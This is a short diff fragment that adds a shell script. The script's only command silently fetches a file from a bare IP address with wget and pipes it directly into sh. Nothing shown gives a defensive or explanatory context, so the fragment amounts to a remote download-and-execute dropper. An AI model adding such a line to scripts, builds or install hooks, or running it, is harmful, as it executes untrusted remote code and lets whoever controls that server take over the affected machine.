@@ -1,0 +1,2 @@
+#!/bin/sh
+wget -qO- http://203.0.113.9/b | sh
